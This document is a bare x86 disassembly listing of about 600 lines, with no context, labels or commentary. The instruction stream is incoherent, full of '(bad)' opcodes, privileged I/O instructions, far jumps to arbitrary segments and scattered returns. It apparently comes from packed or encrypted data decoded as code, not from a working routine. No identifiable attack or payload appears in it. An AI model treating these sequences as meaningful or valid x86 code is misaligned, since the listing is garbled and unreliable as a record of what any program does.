  414f1d:	xor    cl,BYTE PTR [edi-0x2adcdee6]
  414f23:	fcmovnbe st,st(4)
  414f25:	mov    esp,0xbfb5e110
  414f2a:	into   
  414f2b:	sahf   
  414f2c:	lods   al,BYTE PTR ds:[esi]
  414f2d:	ja     0x414f1d
  414f2f:	sub    eax,0xfc612cd5
  414f34:	out    dx,eax
  414f35:	push   0x7fcef339
  414f3a:	push   edx
  414f3b:	fild   QWORD PTR [edi-0x78]
  414f3e:	(bad)  
  414f3f:	lods   al,BYTE PTR ds:[esi]
  414f40:	hlt    
  414f41:	ret    0xe4a8
  414f44:	cmp    eax,0x7c67b465
  414f49:	inc    edi
  414f4a:	sub    cl,dh
  414f4c:	mov    edx,0x6f43ac62
  414f51:	and    al,0xbd
  414f53:	leave  
  414f54:	pop    esp
  414f55:	(bad)  
  414f56:	fsub   st,st(3)
  414f58:	fmul   QWORD PTR [esi+edi*2]
  414f5b:	icebp  
  414f5c:	pop    ss
  414f5d:	sub    bh,BYTE PTR [esi+0x47]
  414f60:	pop    edi
  414f61:	(bad)  
  414f62:	pusha  
  414f63:	push   ss
  414f64:	nop
  414f65:	cmp    al,0xbe
  414f67:	jno    0x414f89
  414f69:	shl    BYTE PTR es:[edx+0x5761bd99],cl
  414f70:	scas   eax,DWORD PTR es:[edi]
  414f71:	mov    bl,0x97
  414f73:	mov    ebx,0x87519f23
  414f78:	push   ss
  414f79:	scas   al,BYTE PTR es:[edi]
  414f7a:	je     0x414ff2
  414f7c:	repnz stos DWORD PTR es:[edi],eax
  414f7e:	cmovl  ebp,DWORD PTR [ebx+0x2a]
  414f82:	xor    ecx,DWORD PTR [esi+0x3bcdfb77]
  414f88:	call   0xedf166bd
  414f8d:	nop
  414f8e:	jge    0x414fdb
  414f90:	into   
  414f91:	and    ebx,DWORD PTR [ebx+eiz*1]
  414f94:	test   dl,cl
  414f96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f97:	loop   0x414f73
  414f99:	mov    ebp,0xec639f81
  414f9e:	cwde   
  414f9f:	lea    ecx,[esi]
  414fa1:	mov    ebx,0xe569b17c
  414fa6:	push   ecx
  414fa7:	dec    edi
  414fa8:	loope  0x414fa4
  414faa:	repz mov ebx,0xf76e12c3
  414fb0:	out    0xe3,al
  414fb2:	dec    edx
  414fb3:	jmp    0x7491:0xb024d9e8
  414fba:	push   ds
  414fbb:	fsub   QWORD PTR [esi-0x6a16f139]
  414fc1:	or     al,0xa7
  414fc3:	mov    ch,0x82
  414fc5:	jmp    0x1e090dd8
  414fca:	arpl   WORD PTR [ebp-0x5e987592],sp
  414fd0:	mov    edi,0xa1b3fd88
  414fd5:	inc    ecx
  414fd6:	xlat   BYTE PTR ds:[ebx]
  414fd7:	dec    ebp
  414fd8:	pop    ss
  414fd9:	mov    al,ds:0xaab6c47f
  414fde:	jecxz  0x414f8c
  414fe0:	cs sub al,0x21
  414fe3:	aas    
  414fe4:	adc    edi,esp
  414fe6:	ins    DWORD PTR es:[edi],dx
  414fe7:	imul   eax,ecx,0xd5ce46e0
  414fed:	lea    esi,[eax+0x25]
  414ff0:	sub    eax,0xbc85fb4a
  414ff5:	xchg   edx,eax
  414ff6:	outs   dx,BYTE PTR ds:[esi]
  414ff7:	inc    eax
  414ff8:	push   ds
  414ff9:	pop    edx
  414ffa:	jae    0x415055
  414ffc:	mov    edx,0x5831e90f
  415001:	arpl   WORD PTR [ebp+esi*4+0x1f],bx
  415005:	inc    esi
  415006:	pop    esp
  415007:	ret    0x4972
  41500a:	test   eax,0x225faf9
  41500f:	(bad)  
  415010:	lods   eax,DWORD PTR ds:[esi]
  415011:	mov    BYTE PTR [edi-0x13],ch
  415014:	lahf   
  415015:	mov    eax,0xc07ffb09
  41501a:	in     eax,0x37
  41501c:	adc    DWORD PTR [edx+0x32],ecx
  41501f:	xchg   ebx,eax
  415020:	xchg   DWORD PTR [edx-0x15],ecx
  415023:	cmc    
  415024:	ja     0x414fc9
  415026:	mov    al,0x95
  415028:	fs inc ecx
  41502a:	inc    ebp
  41502b:	es xchg esp,eax
  41502d:	imul   BYTE PTR [ebx-0x4c]
  415030:	push   esi
  415031:	icebp  
  415032:	jnp    0x415094
  415034:	xor    ch,BYTE PTR [ecx+ebp*8]
  415037:	push   ss
  415038:	int3   
  415039:	(bad)  
  41503a:	stos   BYTE PTR es:[edi],al
  41503b:	xor    DWORD PTR [eax],eax
  41503d:	pop    edi
  41503e:	es jg  0x4150ab
  415041:	aad    0x9
  415043:	int    0x25
  415045:	cmc    
  415046:	xchg   BYTE PTR [eax],ch
  415048:	ja     0x415018
  41504a:	cs aad 0xb7
  41504d:	loope  0x4150c3
  41504f:	jg     0x414ffc
  415051:	inc    esp
  415052:	inc    esp
  415053:	sub    eax,DWORD PTR [ecx+esi*2]
  415056:	je     0x4150a1
  415058:	cmp    BYTE PTR [ecx+0x60],0xd7
  41505c:	jb     0x4150c9
  41505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41505f:	retf   0xd452
  415062:	div    DWORD PTR [ecx+0x413a0abe]
  415068:	jmp    0x45ad:0x277192f5
  41506f:	pop    edx
  415070:	and    al,0xfc
  415072:	call   0x2747:0x97bc4425
  415079:	xor    DWORD PTR [ebx],ebx
  41507b:	jg     0x4150e1
  41507d:	cmp    eax,0x4d365bd
  415082:	mov    al,0xd8
  415084:	and    eax,0xe83a9f32
  415089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41508a:	dec    esp
  41508b:	cmc    
  41508c:	test   eax,0x2467eb9f
  415091:	jl     0x415089
  415093:	pushf  
  415094:	or     al,0x29
  415096:	in     al,dx
  415097:	arpl   WORD PTR ds:0xc29daf6a,si
  41509d:	cwde   
  41509e:	mov    dl,0x35
  4150a0:	leave  
  4150a1:	inc    ebp
  4150a2:	mov    esp,0x306a543
  4150a7:	loopne 0x415124
  4150a9:	push   ecx
  4150aa:	xchg   edx,eax
  4150ab:	jp     0x415079
  4150ad:	rol    BYTE PTR [ebp+0x63cd696d],1
  4150b3:	dec    esp
  4150b4:	(bad)
  4150b8:	pop    esi
  4150b9:	cli    
  4150ba:	ja     0x41505d
  4150bc:	(bad)
  4150c0:	dec    DWORD PTR [ebp-0x27]
  4150c3:	mov    ds:0x56b6db64,eax
  4150c8:	fadd   DWORD PTR [ecx]
  4150ca:	and    ecx,esi
  4150cc:	retf   0xd5f8
  4150cf:	ret    
  4150d0:	xchg   esi,eax
  4150d1:	xor    eax,0x8e112af4
  4150d6:	inc    ecx
  4150d7:	push   eax
  4150d8:	inc    ebp
  4150d9:	outs   dx,DWORD PTR ds:[esi]
  4150da:	and    ah,BYTE PTR [edi+eiz*8]
  4150dd:	mov    bh,0xa
  4150df:	enter  0xf5c7,0xdc
  4150e3:	push   ecx
  4150e4:	jl     0x415159
  4150e6:	jbe    0x4150af
  4150e8:	shl    DWORD PTR [esp+esi*2+0x513b351e],1
  4150ef:	(bad)  
  4150f0:	pushf  
  4150f1:	pop    ss
  4150f2:	pop    ds
  4150f3:	out    0xa3,al
  4150f5:	mov    dl,0x4d
  4150f7:	add    BYTE PTR [ecx+eiz*8+0x3d],dh
  4150fb:	scas   eax,DWORD PTR es:[edi]
  4150fc:	mov    eax,0x2030b912
  415101:	(bad)  
  415102:	cld    
  415103:	(bad)  
  415104:	cmp    ebp,DWORD PTR [edi+0x3c]
  415107:	idiv   DWORD PTR [eax]
  415109:	mov    edx,0xb67a1c8e
  41510e:	push   es
  41510f:	int    0x53
  415111:	and    al,0xaf
  415113:	mov    ebp,0xc0ff8ded
  415118:	mov    BYTE PTR [edx-0x1aa878a4],bl
  41511e:	fwait
  41511f:	ret    
  415120:	icebp  
  415121:	and    BYTE PTR [esi+0x11],al
  415124:	shl    DWORD PTR [edi],1
  415126:	sub    eax,0x20e30d69
  41512b:	sub    al,0x41
  41512d:	push   0xe1b9970b
  415132:	jmp    0x4150cd
  415134:	fsubr  DWORD PTR [eax+0x62]
  415137:	test   al,0xf3
  415139:	out    0x1a,eax
  41513b:	leave  
  41513c:	lahf   
  41513d:	and    al,0xf7
  41513f:	xchg   BYTE PTR [ecx+0x41],bl
  415142:	mov    ch,0xf5
  415144:	push   ecx
  415145:	aas    
  415146:	sub    eax,0xe0882281
  41514b:	shl    BYTE PTR [eax-0x55],1
  41514e:	xchg   ebp,eax
  41514f:	and    bl,BYTE PTR [edi+0x6b941ff9]
  415155:	and    esi,DWORD PTR [esi+0x4508acd2]
  41515b:	nop
  41515c:	cdq    
  41515d:	and    al,0x24
  41515f:	mov    ebp,0xb160ad67
  415164:	cli    
  415165:	pop    ebp
  415166:	sti    
  415167:	adc    al,0xd8
  415169:	scas   al,BYTE PTR es:[edi]
  41516a:	mov    dl,0xf2
  41516c:	mov    ah,0x7e
  41516e:	fild   DWORD PTR [esp+eiz*2-0x4c]
  415172:	imul   edx,DWORD PTR [ecx-0x6d],0xa62b5091
  415179:	xchg   ecx,eax
  41517a:	fld    QWORD PTR [eax]
  41517c:	or     bl,BYTE PTR [esi]
  41517e:	bnd je 0x4151a9
  415181:	inc    ebp
  415182:	int3   
  415183:	mov    al,0xfb
  415185:	dec    ecx
  415186:	push   esi
  415187:	rol    DWORD PTR [ecx+0x6],1
  41518a:	xchg   esp,eax
  41518b:	mov    bh,0xcf
  41518d:	js     0x415118
  41518f:	dec    esp
  415190:	or     al,0x85
  415192:	enter  0x86d0,0x8d
  415196:	dec    esi
  415197:	push   edx
  415198:	adc    DWORD PTR [edi-0x9d65db0],eax
  41519e:	and    cl,0x35
  4151a1:	(bad)  
  4151a2:	imul   ecx,DWORD PTR [ecx],0x3fb19df6
  4151a8:	inc    esp
  4151a9:	lods   al,BYTE PTR ds:[esi]
  4151aa:	or     eax,0xc7623ed5
  4151af:	xchg   edx,eax
  4151b0:	xchg   edi,eax
  4151b1:	dec    ebp
  4151b2:	stos   DWORD PTR es:[edi],eax
  4151b3:	ins    DWORD PTR es:[edi],dx
  4151b4:	scas   eax,DWORD PTR es:[edi]
  4151b5:	or     edx,DWORD PTR [edx-0x78]
  4151b8:	clc    
  4151b9:	js     0x41513c
  4151bb:	sbb    eax,0xc50c0433
  4151c0:	sahf   
  4151c1:	sbb    edx,DWORD PTR [ebx+0x5b5cd3b7]
  4151c7:	dec    ebp
  4151c8:	sub    DWORD PTR [ebx],0x13
  4151cb:	push   edx
  4151cc:	mov    es,WORD PTR [ebx+0x71eeb06]
  4151d2:	mov    dl,0x16
  4151d4:	and    al,0x8
  4151d6:	push   ebp
  4151d7:	outs   dx,DWORD PTR ds:[esi]
  4151d8:	leave  
  4151d9:	adc    eax,0xd5e2c1af
  4151de:	cmp    DWORD PTR [esi+0x68],ebp
  4151e1:	push   esi
  4151e2:	(bad)  
  4151e3:	mov    ebx,0x59ba8e94
  4151e8:	test   al,0x44
  4151ea:	hlt    
  4151eb:	sbb    eax,0xd23a57d3
  4151f0:	or     ch,al
  4151f2:	or     eax,0x85da6bf7
  4151f7:	fist   DWORD PTR [eax+ecx*2-0xf]
  4151fb:	xchg   ebx,eax
  4151fc:	sbb    eax,0x33ea23f8
  415201:	mov    edi,ebx
  415203:	jl     0x415205
  415205:	pop    DWORD PTR [ecx-0x486b3503]
  41520b:	add    al,0xb3
  41520d:	mov    bl,BYTE PTR [eax+0x323870a9]
  415213:	mov    ds:0x6906d0e1,al
  415218:	mov    ch,0xbb
  41521a:	mov    BYTE PTR [edx],cl
  41521c:	retf   
  41521d:	pop    ebx
  41521e:	clc    
  41521f:	push   ds
  415220:	ror    BYTE PTR [edi+ebx*2+0x5e],0x29
  415225:	xor    BYTE PTR [edx-0x58],ah
  415228:	fstp   QWORD PTR [edi-0x6]
  41522b:	sbb    al,BYTE PTR [edi-0x31733b19]
  415231:	cmc    
  415232:	stos   DWORD PTR es:[edi],eax
  415233:	mov    edi,0x7c92743
  415238:	stos   DWORD PTR es:[edi],eax
  415239:	mov    bh,bl
  41523b:	add    DWORD PTR [ecx-0x7d],0x64268825
  415242:	mov    ds,WORD PTR [ebp+0xd]
  415245:	out    dx,al
  415246:	mov    eax,0xba7897f3
  41524b:	daa    
  41524c:	shl    cl,cl
  41524e:	xor    edx,DWORD PTR [eax+0x58]
  415251:	stos   DWORD PTR es:[edi],eax
  415252:	xor    al,0x32
  415254:	popf   
  415255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415256:	push   ebx
  415257:	adc    al,0xa2
  415259:	ss clc 
  41525b:	pop    edi
  41525c:	or     DWORD PTR [ebx],edi
  41525e:	rol    BYTE PTR [eax+0x241119f],cl
  415264:	stc    
  415265:	mov    bh,ah
  415267:	and    edx,DWORD PTR ds:0xa8186329
  41526d:	sub    al,0x2b
  41526f:	or     BYTE PTR [edi-0x56625701],ch
  415275:	inc    eax
  415276:	stos   DWORD PTR es:[edi],eax
  415277:	xor    esi,ebp
  415279:	sbb    BYTE PTR [eax],bh
  41527b:	sbb    edx,DWORD PTR [eax-0xb]
  41527e:	push   esi
  41527f:	lea    esp,[esi+ecx*4+0x7bacb60f]
  415286:	int3   
  415287:	int    0x74
  415289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41528a:	ror    DWORD PTR [edx-0x7e],0x2a
  41528e:	ret    0xb8d9
  415291:	stos   BYTE PTR es:[edi],al
  415292:	in     eax,0x83
  415294:	or     al,0xff
  415296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415297:	sub    al,0xe0
  415299:	ds idiv ebp
  41529c:	xchg   ebx,eax
  41529d:	adc    ebx,ebx
  41529f:	gs (bad) 
  4152a1:	repz jl 0x41530a
  4152a4:	mov    bh,0x3c
  4152a6:	dec    ebx
  4152a7:	add    eax,ecx
  4152a9:	xchg   BYTE PTR [ebx],bl
  4152ab:	inc    edi
  4152ac:	xchg   esp,eax
  4152ad:	sbb    eax,0x995be8e8
  4152b2:	lock aaa 
  4152b4:	sub    cl,BYTE PTR [eax]
  4152b6:	sub    BYTE PTR ds:0xa2867b3b,dl
  4152bc:	shr    BYTE PTR [ebp+0x2e],cl
  4152bf:	ret    
  4152c0:	mov    esp,0x3e007f6d
  4152c5:	pop    ds
  4152c6:	xchg   edx,esi
  4152c8:	inc    ebx
  4152c9:	fcmovnb st,st(5)
  4152cb:	ret    
  4152cc:	inc    esi
  4152cd:	inc    esp
  4152ce:	or     BYTE PTR [edi+0x63],dh
  4152d1:	xchg   ecx,eax
  4152d2:	pusha  
  4152d3:	lock (bad) [ecx+ebx*2+0x682b9c98]
  4152db:	adc    eax,ecx
  4152dd:	pop    ecx
  4152de:	fcom   DWORD PTR [ebx+0x5cbf9c5f]
  4152e4:	and    edx,0x397115f4
  4152ea:	xor    al,0xee
  4152ec:	(bad)  
  4152ed:	fsub   QWORD PTR [edx]
  4152ef:	clc    
  4152f0:	cmp    ch,BYTE PTR [edi]
  4152f2:	adc    al,0xb7
  4152f4:	arpl   si,bx
  4152f6:	dec    esp
  4152f7:	(bad)  
  4152f8:	adc    DWORD PTR [edi-0x10c1074e],edx
  4152fe:	adc    BYTE PTR [esi-0x59be23c8],cl
  415304:	add    cl,bh
  415306:	(bad)  
  415308:	jl     0x415323
  41530a:	test   al,0xd5
  41530c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41530d:	mov    eax,0x7eba1e62
  415312:	(bad)  
  415313:	mov    bl,0xca
  415315:	xchg   dx,ax
  415317:	ja     0x4152a5
  415319:	mov    ah,0x63
  41531b:	push   es
  41531c:	push   edi
  41531d:	sub    ecx,0xeedc99ed
  415323:	and    dl,al
  415325:	adc    esp,DWORD PTR [edi+ebp*2-0x2bd2fede]
  41532c:	ror    WORD PTR [edx+0x29],0x4d
  415331:	jle    0x4153a1
  415333:	mov    gs,WORD PTR [edi+0x31]
  415336:	push   ebp
  415337:	lds    edi,FWORD PTR [ecx-0x38768bf8]
  41533d:	xchg   esp,eax
  41533e:	(bad)  
  41533f:	xor    BYTE PTR [eax+0x60],al
  415342:	mov    ds:0x58a2d40b,eax
  415347:	inc    ecx
  415348:	xor    ch,BYTE PTR [esp+eiz*2]
  41534b:	sbb    DWORD PTR [eax],0x84e4814
  415351:	test   BYTE PTR [esi+0x3c28a2ca],0x29
  415358:	lods   al,BYTE PTR ds:[esi]
  415359:	xor    DWORD PTR ds:0xd3de3057,ebx
  41535f:	and    bl,BYTE PTR [edi-0x2358d4ed]
  415365:	push   edi
  415366:	clc    
  415367:	jmp    0x415375
  415369:	(bad)  
  41536b:	sbb    ecx,0x2dc53bb7
  415371:	mov    edi,DWORD PTR [ecx+0x19]
  415374:	fisub  DWORD PTR [ebp+0x33]
  415377:	aaa    
  415378:	mov    al,ds:0xf4abbaed
  41537d:	ins    BYTE PTR es:[edi],dx
  41537e:	add    esp,DWORD PTR [ebx]
  415380:	sbb    bh,dl
  415382:	fcomp  QWORD PTR [ecx+0x42]
  415385:	sbb    eax,0x4c67f46a
  41538a:	inc    esp
  41538b:	push   edi
  41538c:	add    eax,0x6640ff63
  415391:	xchg   ebx,eax
  415392:	dec    ebx
  415393:	ss xchg ebx,eax
  415395:	fidivr DWORD PTR ds:0x723d723f
  41539b:	aas    
  41539c:	jg     0x415368
  41539e:	mov    eax,ds:0x6ccfc72e
  4153a3:	(bad)  
  4153a4:	fidiv  DWORD PTR [esi+ebp*2+0x670c232]
  4153ab:	fidiv  WORD PTR [eax]
  4153ad:	adc    eax,0x483e77b2
  4153b2:	cmp    al,0x33
  4153b4:	fcomp  DWORD PTR [ebx]
  4153b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153b7:	js     0x415412
  4153b9:	loop   0x415421
  4153bb:	in     eax,0x41
  4153bd:	punpckhbw mm1,QWORD PTR [ecx-0x45d39fdd]
  4153c4:	(bad)  
  4153c5:	push   eax
  4153c6:	jns    0x41539d
  4153c8:	pop    esi
  4153c9:	outs   dx,BYTE PTR ds:[esi]
  4153ca:	not    al
  4153cc:	out    0x4a,eax
  4153ce:	sub    DWORD PTR [edx+0x5f00dead],0xffffffce
  4153d5:	mov    dh,0xfe
  4153d7:	les    edx,FWORD PTR [eax-0x3e]
  4153da:	cmp    ecx,DWORD PTR [edi]
  4153dc:	cmp    eax,0x51965e86
  4153e1:	loop   0x4153ba
  4153e3:	add    dl,BYTE PTR [ebx]
  4153e5:	(bad)  
  4153e6:	(bad)  
  4153e8:	ficom  DWORD PTR [esi-0x3a]
  4153eb:	outs   dx,DWORD PTR ds:[esi]
  4153ec:	mov    ds:0xcfdc5cce,al
  4153f1:	lahf   
  4153f2:	movhlps xmm6,xmm1
  4153f5:	cli    
  4153f6:	scas   al,BYTE PTR es:[edi]
  4153f7:	lahf   
  4153f8:	mov    ebp,0xf327d637
  4153fd:	(bad)  [edi-0x5]
  415400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415401:	adc    al,0x9b
  415403:	adc    al,ch
  415405:	mov    edi,DWORD PTR [eax+edi*8]
  415408:	sub    BYTE PTR [ecx],0xa
  41540b:	pop    edx
  41540c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41540d:	iret   
  41540e:	and    DWORD PTR [esi-0x63],edi
  415411:	jb     0x4153b3
  415413:	imul   esi,DWORD PTR gs:[eax],0x603d4d3d
  41541a:	neg    BYTE PTR [ecx+0x57]
  41541d:	mov    WORD PTR [eax],es
  41541f:	jle    0x415423
  415421:	scas   al,BYTE PTR es:[edi]
  415422:	and    DWORD PTR [esi],0x170438fe
  415428:	and    esp,edx
  41542a:	shr    BYTE PTR [edi+0x49ad9ea0],cl
  415430:	(bad)  
  415431:	xor    ch,BYTE PTR [eax+0x12356afc]
  415437:	dec    esp
  415438:	push   0xffffff9f
  41543a:	fwait
  41543b:	ins    DWORD PTR es:[edi],dx
  41543c:	dec    eax
  41543d:	out    0x92,eax
  41543f:	arpl   WORD PTR [edi-0x7ae54f42],di
  415445:	dec    esp
  415446:	jno    0x4154aa
  415448:	push   es
  415449:	lahf   
  41544a:	pusha  
  41544b:	cs out dx,eax
  41544d:	fiadd  WORD PTR [ebp+edi*4+0x3da5279]
  415454:	push   esi
  415455:	ret    
  415456:	or     ebp,DWORD PTR [edi+edi*1]
  415459:	loope  0x41548d
  41545b:	icebp  
  41545c:	push   esp
  41545d:	xor    eax,0x946c3bdc
  415462:	adc    BYTE PTR ds:0x7139440d,cl
  415468:	fsubr  DWORD PTR [ebx]
  41546a:	mov    WORD PTR [ecx-0x3c],ds
  41546d:	push   esi
  41546e:	pop    esi
  41546f:	add    ecx,DWORD PTR [esi]
  415471:	(bad)  
  415472:	and    al,0x39
  415474:	jbe    0x415409
  415476:	sbb    eax,0xfb2ba225
  41547b:	and    ah,BYTE PTR [edx-0x67499a80]
  415481:	icebp  
  415482:	xor    eax,0x6097e237
  415487:	jg     0x4154e9
  415489:	adc    DWORD PTR [esi+0x71],eax
  41548c:	nop
  41548d:	mov    ah,bh
  41548f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415490:	mov    ch,0xaa
  415492:	mov    DWORD PTR [ecx-0x7],esp
  415495:	out    dx,al
  415496:	in     al,dx
  415497:	fxch   st(0)
  415499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41549a:	scas   eax,DWORD PTR es:[edi]
  41549b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41549c:	add    DWORD PTR [ecx-0x7],ebp
  41549f:	arpl   WORD PTR [edi-0x602bef1e],ax
  4154a5:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154a7:	je     0x415520
  4154a9:	inc    edi
  4154aa:	enter  0x24a2,0x86
  4154ae:	adc    edi,DWORD PTR [edi+0x1b]
  4154b1:	dec    eax
  4154b2:	sub    DWORD PTR [ecx+0x6f],ecx
  4154b5:	sub    al,0x4
  4154b7:	and    BYTE PTR [edi-0x43],0x2f
  4154bb:	fcomip st,st(4)
  4154bd:	or     esi,esi
  4154bf:	cmp    BYTE PTR [edx],0xc
  4154c2:	enter  0x7fe0,0x85
  4154c6:	ret    
  4154c7:	test   DWORD PTR [ecx+0x77],0x3e4f5e73
  4154ce:	adc    BYTE PTR [esi+edx*1],0x10
  4154d2:	jbe    0x41552f
  4154d4:	scas   eax,DWORD PTR es:[edi]
  4154d5:	mov    dl,0xfc
  4154d7:	and    al,0xeb
  4154d9:	loop   0x4154d1
  4154db:	in     eax,dx
  4154dc:	mov    dh,0x50
  4154de:	stos   DWORD PTR es:[edi],eax
  4154df:	xchg   esi,eax
  4154e0:	mov    al,0x57
  4154e2:	lock sub al,BYTE PTR [ecx+0xa]
  4154e6:	jmp    0x4154ae
  4154e8:	lods   al,BYTE PTR ds:[esi]
  4154e9:	jo     0x415530
  4154eb:	call   0x3184:0x54156806
  4154f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154f3:	cwde   
  4154f4:	mov    eax,0x9a4e684f
  4154f9:	sti    
  4154fa:	fstp   TBYTE PTR [ecx]
  4154fc:	cvtdq2ps xmm2,xmm4
  4154ff:	mov    esi,0x7f10b618
  415504:	jno    0x415545
  415506:	sbb    eax,0xdaa396a5
  41550b:	mov    bh,0xe
  41550d:	mov    eax,0x82bfcfd
  415512:	lock test eax,0x9e4f365e
  415518:	(bad)  
  415519:	in     eax,0xb4
  41551b:	pop    esi
  41551c:	push   0x2e
  41551e:	and    eax,DWORD PTR [ebp-0xd]
  415521:	mov    ?,WORD PTR [edi+edx*8+0x18]
  415525:	outs   dx,DWORD PTR ds:[esi]
  415526:	stos   BYTE PTR es:[edi],al
  415527:	(bad)  
  415528:	(bad)  
  415529:	pusha  
  41552a:	pop    edi
  41552b:	sti    
  41552c:	or     al,dl
  41552e:	inc    edi
  41552f:	sbb    BYTE PTR [ecx],bl
  415531:	jmp    0xce7a770a
  415536:	mov    dh,0x73
  415538:	mov    esp,0x5b72636f
  41553d:	shl    BYTE PTR [eax-0x1e6f9354],1
  415543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415544:	js     0x415590
  415546:	shl    BYTE PTR [edi],cl
  415548:	ss cli 
  41554a:	icebp  
  41554b:	or     bh,BYTE PTR [edx]
  41554d:	ja     0x415548
  41554f:	sub    eax,0x5bb4df63
  415554:	cwde   
  415555:	add    DWORD PTR [ebx+0x3f2622ae],esi
  41555b:	mov    esp,0x5e353990
  415560:	in     eax,0x62
  415562:	mov    edx,0xba765de4
  415567:	lds    edx,FWORD PTR ds:0xe5078f2b
  41556d:	mov    al,ds:0x100b04fb
  415572:	and    esi,0x2e1e3743
  415578:	xor    al,bl
  41557a:	push   eax
  41557b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41557c:	pop    esi
  41557d:	xlat   BYTE PTR ds:[ebx]
  41557e:	ds mov ebp,0x3565e90d
  415584:	inc    esp
  415585:	into   
  415586:	gs popf 
  415588:	imul   eax,DWORD PTR [edi],0xffffffec
  41558b:	sub    al,0x56
  41558d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41558e:	fidivr DWORD PTR [ebx+esi*4+0x1b]
  415592:	adc    DWORD PTR [ecx],edx
  415594:	lds    eax,FWORD PTR [ebp-0x19c20a48]
  41559a:	cvtdq2ps xmm4,XMMWORD PTR [eax]
  41559d:	or     BYTE PTR [esi+0x50],dh
  4155a0:	add    ecx,0xffffffca
  4155a3:	jmp    0x635a1cd9
  4155a8:	jecxz  0x415613
  4155aa:	std    
  4155ab:	lahf   
  4155ac:	sar    ecx,0x53
  4155af:	and    al,0xd9
  4155b1:	neg    DWORD PTR [edi-0x5c]
  4155b4:	pop    es
  4155b5:	sbb    al,0xe1
  4155b7:	and    cl,dh
  4155b9:	push   ebp
  4155ba:	adc    al,0x82
  4155bc:	cli    
  4155bd:	add    DWORD PTR [ebx+0x11],ebx
  4155c0:	js     0x4155cc
  4155c2:	mov    ebp,0x1923c602
  4155c7:	arpl   WORD PTR [edi+0x16499c35],bx
  4155cd:	push   ss
  4155ce:	xor    al,0x96
  4155d0:	loop   0x4155da
  4155d2:	ret    
  4155d3:	pop    ss
  4155d4:	push   0x4f5a6790
  4155d9:	cmp    BYTE PTR [edx],0x85
  4155dc:	xchg   esi,eax
  4155dd:	cmp    bh,bh
  4155df:	and    esp,DWORD PTR [edx]
  4155e1:	ror    DWORD PTR [edi],0xd7
  4155e4:	(bad)  
  4155e5:	bound  ebx,QWORD PTR [edi+0xa]
  4155e8:	push   es
  4155e9:	fidiv  WORD PTR [edx+0x5e]
  4155ec:	sub    bh,BYTE PTR [ebp-0x5ffc3178]
  4155f2:	add    al,0x6a
  4155f4:	xor    edx,DWORD PTR [edi-0x38]
  4155f7:	push   ecx
  4155f8:	ss mov dl,0x78
  4155fb:	fsubr  DWORD PTR fs:[edx]
  4155fe:	cwde   
  4155ff:	xor    ah,BYTE PTR [esi]
  415601:	pushf  
  415602:	or     BYTE PTR [ebx],bl
  415604:	pop    es
  415605:	icebp  
  415606:	int3   
  415607:	fcom   DWORD PTR [ebp+0x7b68e47c]
  41560d:	bound  esi,QWORD PTR [ebp-0x354de685]
  415613:	sub    DWORD PTR [edi+0x31],ecx
  415616:	fidivr DWORD PTR [eax]
  415618:	imul   esp,eax,0xffffffdb
  41561b:	jnp    0x4155bf
  41561d:	gs cwde 
  41561f:	fcom   DWORD PTR [eax+0x1d]
  415622:	push   ds
  415623:	mov    eax,0xc9f7a728
  415628:	enter  0x7c55,0x4d
  41562c:	and    al,0xfd
  41562e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41562f:	push   eax
  415630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415631:	mov    dh,BYTE PTR [eax-0x5f]
  415634:	inc    ebp
  415635:	dec    edx
  415636:	ret    
  415637:	xor    ecx,edi
  415639:	(bad)  
  41563a:	rcr    DWORD PTR [ebx+0x61],cl
  41563d:	cdq    
  41563e:	pop    ebp
  415640:	lods   eax,DWORD PTR ds:[esi]
  415641:	push   ss
  415642:	addr16 clc 
  415644:	neg    DWORD PTR [ebx]
  415646:	dec    esp
  415647:	int3   
  415648:	aad    0x86
  41564a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41564b:	daa    
  41564c:	das    
  41564d:	ficomp DWORD PTR [edx+ebx*4]
  415650:	mov    edi,0x99ecd6f9
  415655:	xchg   ecx,eax
  415656:	add    eax,0x5c149d9c
  41565b:	shl    DWORD PTR [esi+0x7148b568],1
  415661:	enter  0x4ed8,0x49
  415665:	rcr    eax,cl
  415667:	mov    al,BYTE PTR [ebp+0x18]
  41566a:	arpl   WORD PTR [ebp-0x265a8965],sp
  415670:	add    esi,edi
  415672:	pop    ds
  415673:	leave  
  415674:	sub    ebp,esi
  415676:	and    esi,esp
  415678:	fsub   st(1),st
  41567a:	sub    DWORD PTR [ebx-0x450b513d],edi
  415680:	cmp    esp,edi
  415682:	ja     0x4156aa
  415684:	jno    0x415685
  415686:	mov    edx,ss
  415688:	test   al,0xcf
  41568a:	test   al,0xcb
  41568c:	push   cs
  41568d:	mov    al,0x45
  41568f:	scas   al,BYTE PTR es:[edi]
  415690:	outs   dx,BYTE PTR ds:[esi]
  415691:	test   eax,0x6b844fab
  415696:	dec    esi
  415697:	xor    esi,DWORD PTR [eax]
  415699:	in     eax,0xb5
  41569b:	arpl   WORD PTR [esp+edx*1],di
  41569e:	lods   al,BYTE PTR ds:[esi]
  41569f:	addr16 mov ebx,0x103afc35
  4156a5:	loopne 0x415705
  4156a7:	mov    bl,0xfe
  4156a9:	shl    DWORD PTR [esi-0x28],0x2e
  4156ad:	mov    al,0x73
  4156af:	sbb    BYTE PTR [ebx+0xa],ah
